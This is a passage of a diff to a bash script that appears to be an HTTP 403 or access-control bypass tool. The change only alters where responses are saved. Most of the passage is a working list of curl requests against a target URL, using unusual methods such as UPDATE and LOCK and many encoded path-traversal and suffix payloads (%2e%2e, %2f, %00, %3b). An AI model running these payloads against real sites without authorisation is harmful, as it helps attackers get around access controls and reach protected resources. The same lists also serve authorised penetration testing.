-code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X UPDATE)
+echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -H "$user_agent" -X UPDATE
+code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -H "$user_agent" -X UPDATE)
 print
 echo  -n "LOCK : "
-echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X LOCK
-code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X LOCK)
+echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -H "$user_agent" -X LOCK
+code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -H "$user_agent" -X LOCK)
 print
 
 
-echo -e ${blue}"----------------------"${end}
-echo -e ${cyan}"[+] URL Encode Bypass "${end}
-echo -e ${blue}"----------------------"${end}
+echo -e ${blue}"-----------------------------"${end}
+echo -e ${cyan}"[+] URL Tricks Bypass suffif "${end}
+echo -e ${blue}"-----------------------------"${end}
 
 
 echo -n "Payload [ #? ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL#?" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL#?" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL#?" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL#?" -H "$user_agent")
 print
 echo -n "Payload [ %09 ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09" -H "$user_agent")
 print
 echo -n "Payload [ %09%3b ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09%3b" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09%3b" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09%3b" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09%3b" -H "$user_agent")
 print
 echo -n "Payload [ %09.. ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09.." -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09.." -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09.." -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09.." -H "$user_agent")
 print
 echo -n "Payload [ %09; ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09;" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09;" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09;" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09;" -H "$user_agent")
 print
 echo -n "Payload [ %20 ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%20" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%20" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%20" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%20" -H "$user_agent")
 print
 echo -n "Payload [ %23%3f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%23%3f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%23%3f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%23%3f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%23%3f" -H "$user_agent")
 print
 echo -n "Payload [ %252f%252f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%252f%252f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%252f%252f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%252f%252f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%252f%252f" -H "$user_agent")
 print
 echo -n "Payload [ %252f/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%252f/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%252f/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%252f/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%252f/" -H "$user_agent")
 print
 echo -n "Payload [ %2e%2e ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e" -H "$user_agent")
 print
 echo -n "Payload [ %2e%2e/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e/" -H "$user_agent")
 print
 echo -n "Payload [ %2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f" -H "$user_agent")
 print
 echo -n "Payload [ %2f%20%23 ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%20%23" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%20%23" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%20%23" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%20%23" -H "$user_agent")
 print
 echo -n "Payload [ %2f%23 ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%23" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%23" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%23" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%23" -H "$user_agent")
 print
 echo -n "Payload [ %2f%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%2f" -H "$user_agent")
 print
 echo -n "Payload [ %2f%3b%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3b%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3b%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3b%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3b%2f" -H "$user_agent")
 print
 echo -n "Payload [ %2f%3b%2f%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3b%2f%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3b%2f%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3b%2f%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3b%2f%2f" -H "$user_agent")
 print
 echo -n "Payload [ %2f%3f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3f" -H "$user_agent")
 print
 echo -n "Payload [ %2f%3f/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3f/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3f/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3f/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3f/" -H "$user_agent")
 print
 echo -n "Payload [ %2f/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f/" -H "$user_agent")
 print
 echo -n "Payload [ %3b ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b" -H "$user_agent")
 print
 echo -n "Payload [ %3b%09 ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%09" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%09" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%09" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%09" -H "$user_agent")
 print
 echo -n "Payload [ %3b%2f%2e%2e ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e%2e" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e%2e" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e%2e" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e%2e" -H "$user_agent")
 print
 echo -n "Payload [ %3b%2f%2e%2e%2f%2e%2e%2f%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e%2e%2f%2e%2e%2f%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e%2e%2f%2e%2e%2f%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e%2e%2f%2e%2e%2f%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e%2e%2f%2e%2e%2f%2f" -H "$user_agent")
 print
 echo -n "Payload [ %3b%2f%2e. ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e." -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e." -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e." -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e." -H "$user_agent")
 print
 echo -n "Payload [ %3b%2f.. ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f.." -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f.." -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f.." -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f.." -H "$user_agent")
 print
 echo -n "Payload [ %3b/%2e%2e/..%2f%2f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2e%2e/..%2f%2f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2e%2e/..%2f%2f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2e%2e/..%2f%2f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2e%2e/..%2f%2f" -H "$user_agent")
 print
 echo -n "Payload [ %3b/%2e. ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2e." -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2e." -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2e." -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2e." -H "$user_agent")
 print
 echo -n "Payload [ %3b/%2f%2f../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2f%2f../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2f%2f../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2f%2f../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2f%2f../" -H "$user_agent")
 print
 echo -n "Payload [ %3b/.. ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/.." -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/.." -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/.." -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/.." -H "$user_agent")
 print
 echo -n "Payload [ %3b//%2f../ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b//%2f../" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b//%2f../" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b//%2f../" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b//%2f../" -H "$user_agent")
 print
 echo -n "Payload [ %3f%23 ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f%23" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f%23" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f%23" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f%23" -H "$user_agent")
 print
 echo -n "Payload [ %3f%3f ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f%3f" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f%3f" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f%3f" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f%3f" -H "$user_agent")
 print
 echo -n "Payload [ .. ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.." -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.." -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.." -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.." -H "$user_agent")
 print
 echo -n "Payload [ ..%00/; ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00/;" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00/;" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00/;" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00/;" -H "$user_agent")
 print
 echo -n "Payload [ ..%00;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00;/" -H "$user_agent")
 print
 echo -n "Payload [ ..%09 ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%09" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%09" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%09" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%09" -H "$user_agent")
 print
 echo -n "Payload [ ..%0d/; ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d/;" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d/;" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d/;" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d/;" -H "$user_agent")
 print
 echo -n "Payload [ ..%0d;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d;/" -H "$user_agent")
 print
 echo -n "Payload [ ..%5c/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%5c/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%5c/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%5c/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%5c/" -H "$user_agent")
 print
 echo -n "Payload [ ..%ff/; ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff/;" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff/;" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff/;" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff/;" -H "$user_agent")
 print
 echo -n "Payload [ ..%ff;/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff;/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff;/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff;/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff;/" -H "$user_agent")
 print
 echo -n "Payload [ ..;%00/ ]:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%00/" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%00/" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%00/" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%00/" -H "$user_agent")
 print
 echo -n "Payload [ ..;%0d/ ]:"
